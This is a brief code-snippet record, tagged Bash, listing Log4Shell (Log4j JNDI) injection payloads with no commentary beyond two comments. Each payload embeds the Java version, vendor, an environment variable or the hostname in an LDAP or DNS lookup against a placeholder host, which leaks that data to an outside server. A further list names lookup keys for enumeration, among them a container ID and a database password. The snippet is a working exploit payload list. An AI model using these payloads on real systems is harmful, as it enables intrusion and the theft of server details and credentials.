---
id: 6255f1bb-b779-4d14-91fb-8fba870bdf9d
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:55:56.490037+00:00'
updated_at: '2023-04-06T03:55:56.497702+00:00'
---

# Code Snippet 6255f1bb

**Language**: Bash

```bash
# Identify Java version and hostname
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}

# More enumerations keywords and variables
java:os
docker:containerId
web:rootDir
bundle:config:db.password
```
